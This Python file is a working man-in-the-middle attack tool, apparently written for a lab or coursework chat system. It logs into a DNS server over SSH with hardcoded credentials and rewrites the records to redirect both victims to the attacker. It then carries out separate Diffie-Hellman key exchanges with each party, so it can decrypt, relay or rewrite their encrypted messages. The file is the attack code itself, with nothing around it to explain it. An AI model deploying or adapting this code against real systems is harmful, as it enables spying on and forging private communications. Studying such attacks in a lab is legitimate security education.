import socket
import paramiko
from config import dns_ip, mitm_ip, ports, msg_length
from diffie_hellman import DH_exchanger


class Evil_Chat(object):

    def __init__(self):
        self.dns_table = {}
        self.dh1 = None
        self.dh2 = None
        self.v1_soc = None
        self.v2_soc = None
        self.v1_name = None
        self.v2_name = None
        self.private = 123456

    def undo_attack(self):
        # Rewrite the original data back to the file
        with open('dns_config - copy', 'r') as f:
            text = f.read()
        with open('dns_config', 'w') as f:
            f.write(text)
        #
        # Put the original file back
        ssh = paramiko.SSHClient()
        ssh.connect(dns_ip, username="dns", password="password")
        sftp = ssh.open_sftp()
        localpath = 'dns_config'
        remotepath = '~/MITM/'
        sftp.put(localpath, remotepath)
        sftp.close()
        ssh.close()

        print('Reverted attack on the DNS server.')

    def do_attack(self):
        # Get the dns table and modify it
        ssh = paramiko.SSHClient()
        ssh.connect(dns_ip, username="dns", password="password")
        sftp = ssh.open_sftp()
        localpath = ''
        remotepath = '~/MITM/dns_config'
        sftp.get(remotepath, localpath)
        sftp.close()
        ssh.close()

        # keep a copy of the original dns config
        with open('dns_config', 'r') as f:
            text = f.read()
        with open('dns_config - copy', 'w') as f:
            f.write(text)
        #

        with open('dns_config', 'w') as f:
            f.write('\n'.join([f'{name}={mitm_ip}:{ports["mitm"]}' for name in self.dns_table.keys()]))

        # Put the evil file in te dns
        ssh = paramiko.SSHClient()
        ssh.connect(dns_ip, username="dns", password="password")
        sftp = ssh.open_sftp()
        localpath = 'dns_config'
        remotepath = '~/MITM/'
        sftp.put(localpath, remotepath)
        sftp.close()
        ssh.close()

        print('DNS attacked and spoofed successfully.')

    def get_v2_name(self, v1_name):
        # Get the name of the other victim
        names = list(self.dns_table.keys())
        names.remove(v1_name)
        v2_name = names[0]
        return v2_name

    def do_evil_DH(self, v1_soc):
        v1_name = v1_soc.recv(msg_length).decode('utf-8')
        v2_name = self.get_v2_name(v1_name)
        self.v1_name = v1_name
        self.v2_name = v2_name

        v2_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        v2_soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        v2_ip, v2_port = self.dns_table[v2_name].split(':')
        v2_soc.connect((v2_ip, int(v2_port)))

        v2_soc.send(f'{v1_name}'.encode('utf-8'))
        v2_recv_name = v2_soc.recv(msg_length).decode("utf-8")
        print(f'Received response from victim 2: {v2_recv_name}')

        # send v2_name back to v1
        v1_soc.send(f'{v2_recv_name}'.encode('utf-8'))
        # receive primes from v1
        primes = v1_soc.recv(msg_length).decode('utf-8')
        # send primes to v2
        v2_soc.send(primes.encode('utf-8'))

        p1, p2 = primes.split()
        p1, p2 = int(p1), int(p2)
        self.dh1 = DH_exchanger(p1, p2, self.private)
        self.dh2 = DH_exchanger(p1, p2, self.private)

        # do DH for v1
        my_v1_partial_key = self.dh1.generate_partial_key()
        v1_soc.send(str(my_v1_partial_key).encode('utf-8'))
        v1_partial_key = int(v1_soc.recv(msg_length).decode('utf-8'))
        self.dh1.generate_full_key(v1_partial_key)
        print(f'DIFFIE HELLMAN for Victim 1 COMPLETE!\n')
        # do DH for v2
        my_v2_partial_key = self.dh2.generate_partial_key()
        v2_partial_key = int(v2_soc.recv(msg_length).decode('utf-8'))
        v2_soc.send(str(my_v2_partial_key).encode('utf-8'))
        self.dh2.generate_full_key(v2_partial_key)
        print(f'DIFFIE HELLMAN for Victim 2 COMPLETE!\n')

        self.v1_soc = v1_soc
        self.v2_soc = v2_soc

    def send_v1(self, msg):
        msg_encrypted = self.dh1.encrypt(msg.encode('utf-8'))
        self.v1_soc.send(msg_encrypted)
        if 'exit' == msg:
            return True

    def receive_v1(self):
        msg = self.v1_soc.recv(msg_length)
        msg = self.dh1.decrypt(msg).decode('utf-8')
        print(f'{self.v1_name.ljust(10)}: {msg}')
        return msg

    def send_v2(self, msg):
        msg_encrypted = self.dh2.encrypt(msg.encode('utf-8'))
        self.v2_soc.send(msg_encrypted)

    def receive_v2(self):
        msg = self.v2_soc.recv(msg_length)
        msg = self.dh2.decrypt(msg).decode('utf-8')
        print(f'{self.v2_name.ljust(10)}: {msg}')
        return msg

    def do_evil_chat(self, mirror_chat):
        try:
            if mirror_chat:
                while True:
                    msg = self.receive_v1()
                    self.send_v2(msg)
                    msg = self.receive_v2()
                    self.send_v1(msg)
            else:
                while True:
                    msg = self.receive_v1()
                    # we change the message
                    msg = input(f'write to {self.v2_name}: ')
                    self.send_v2(msg)
                    # we change the message
                    msg = self.receive_v2()
                    msg = input(f'write to {self.v1_name}: ')
                    self.send_v1(msg)
        except:
            pass
        finally:
            self.undo_attack()

    def start_listening(self, mirror_chat):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        soc.bind((mitm_ip, ports['mitm']))
        soc.listen()
        while True:
            v1_soc, v1_addr = soc.accept()
            print(f'Intercepted chat request from victim 1: {v1_addr}')
            self.do_evil_DH(v1_soc)
            self.do_evil_chat(mirror_chat)

    def start(self):
        action = input('Would you like to perform the attack first? [Y/N]: ')

        if 'y' in action.lower():
            self.do_attack()

        with open('dns_config - copy', 'r') as f:
            ips = {l.split('=')[0]: l.split('=')[1] for l in f.readlines()}

        self.dns_table.update(ips)

        mirror_chat = True if 'y' in input('Would you like to listen to chat passively? [Y/N]: ').lower() else False

        print('Waiting for a victim ...')
        self.start_listening(mirror_chat=mirror_chat)


if __name__ == '__main__':
    attacker = Evil_Chat()
    attacker.start()
